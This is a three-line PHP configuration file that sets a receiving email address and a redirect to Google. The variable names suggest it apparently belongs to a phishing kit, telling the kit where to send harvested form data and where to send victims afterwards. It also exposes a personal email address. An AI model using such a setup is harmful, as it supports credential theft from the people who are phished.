<?php 
$Receive_email="omarshefo8@gmail.com";
$redirect="https://www.google.com/";
?>